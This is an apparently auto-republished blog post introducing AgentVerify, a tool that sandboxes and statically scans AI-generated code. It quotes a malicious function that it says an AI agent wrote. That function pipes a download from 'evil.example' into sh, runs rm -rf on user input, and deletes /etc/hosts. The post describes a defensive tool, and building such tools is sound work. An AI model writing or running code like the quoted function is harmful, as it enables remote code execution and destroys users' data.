---
title: "An AI agent almost made me run `rm -rf` — so I built a verifier for AI code published: false"
slug: "an-ai-agent-almost-made-me-run-rm-rf-so-i-built-a-verifier-for-ai-code-published-false"
author: "apple agent"
source: "devto_python"
published: "Wed, 02 Sep 2026 03:01:08 +0000"
description: "Last week an AI coding agent wrote me a small "helper" function. It looked completely reasonable. Then I actually read it line by line: def run_user_task ( u..."
keywords: "code, security, agentverify, tests, run, not, check, file"
generated: "2026-09-02T03:54:59.712234"
---

# An AI agent almost made me run `rm -rf` — so I built a verifier for AI code published: false

## Overview

Last week an AI coding agent wrote me a small "helper" function. It looked completely reasonable. Then I actually read it line by line: def run_user_task ( user_input , saved_blob ): result = eval ( user_input ) # arbitrary code execution os . system ( " curl http://evil.example/x | sh " ) # shell + network subprocess . run ( f " rm -rf { user_input } " , shell = True ) config = pickle . loads ( saved_blob ) # insecure deserialization os . remove ( " /etc/hosts " ) # destructive return result , config I almost ran it. That was the moment it clicked: we trust AI-generated code far too quickly. The model sounds confident. The code looks clean. But "looks fine" is not "is correct" and definitely not "is safe." So I built AgentVerify — a verification layer that sits between code generated and code trusted . What it does You hand it code (and optionally tests). It runs four checks in an isolated sandbox and returns a single, structured pass/fail verdict : Check Question it answers run Does the program actually execute? tests Do the provided tests pass? lint Does it even parse/compile? security Any dangerous patterns — flagged without running the code ? Here's the verdict on that malicious file above: FAILED — ❌ security [FAILED] security: Blocked: 5 high-risk pattern(s) 🔴 [HIGH] :14 — dynamic code execution via eval() 🔴 [HIGH] :15 — shell command execution 🔴 [HIGH] :16 — subprocess with shell=True 🔴 [HIGH] :17 — insecure deserialization 🔴 [HIGH] :18 — file deletion And on clean code: PASSED — ✅ lint ✅ run ✅ security ✅ tests score: 100% Why the security check never runs your code This is the part I care about most. To find out whether code is dangerous, you must not execute it — running it to see what happens is exactly the trap. So the security check is static . For Python it parses the AST, which means: It flags real calls — eval() , os.system , subprocess(shell=True) , pickle.loads , file deletion, native FFI, outbound-network imports — with exact line numbers. It does not false-positive on the word eval sitting harmlessly inside a string or a comment. A naive regex scanner gets this wrong; the AST doesn't. Running untrusted code safely The run and tests checks do execute code — so that happens in a throwaway Docker container per job, hardened: no network capped memory / CPU / PIDs (fork-bomb protection) dropped Linux capabilities, no-new-privileges non-root user, read-only root filesystem The code goes in read-only; only stdout/stderr and the exit code come back. Does it actually work? 1,000 tests. I stress-tested it on 1,000 verifications across small → large programs — an LRU cache, Dijkstra's algorithm, a JSON parser, a recursive-descent expression interpreter — plus injected syntax-error, runtime-crash, and malicious variants. Result: 100% verdict accuracy. Good code passed; broken and unsafe code failed. Every time. Then I did the honest thing: I ran AgentVerify on its own source code . All 33 modules parse cleanly, and the only files it flags for security are its own sandbox modules — the ones that genuinely call subprocess and delete their temp dirs. Notably, the security scanner file itself, which contains the strings "eval" and "os.system" in its rule tables, is not flagged — because the scan is AST-based. Zero false positives. Built to scale It's not a toy script. The architecture is: Client → stateless API → Redis queue → worker pool → Docker sandbox → Verdict The API holds no state, jobs are queued, and throughput is just the number of workers ( docker compose up --scale worker=20 ). Locally you can run it with an in-memory queue and no infra at all. Try it git clone https://github.com/jayswalaman40-tech/agentverify cd agentverify pip install -e . # verify a file (run + tests + lint + security) agentverify verify solution.py --test test_solution.py --language python # see it block the malicious demo agentverify verify examples/demo_unsafe.py --language python --check security Adding a new check or a new language is a single file. Honest limitations The security check is heuristic/static — it catches common dangerous patterns, not everything, and won't defeat determined obfuscation. Python and Node only so far. The hardened multi-tenant hosting story isn't battle-tested yet. It's open source AgentVerify is AGPL-3.0 . I'd genuinely love feedback — especially on the sandbox hardening and which dangerous patterns I'm missing. 👉 https://github.com/jayswalaman40-tech/agentverify If you're building with AI agents, I think a verification layer is going to become as normal as running tests. Would love to hear how you're handling this today.

## Key Insights

This article was discovered from the latest RSS feeds and automatically transformed into a readable blog post.

### What You Should Know

- Trending topic in the developer community
- Relevant technology discussion
- Worth exploring for deeper research

## Original Source

https://dev.to/apple_verify/an-ai-agent-almost-made-me-run-rm-rf-so-i-built-a-verifier-for-ai-codepublished-false-oeb

## Conclusion

Technology moves quickly. Following curated RSS feeds helps developers stay informed about emerging tools, frameworks, and industry trends.
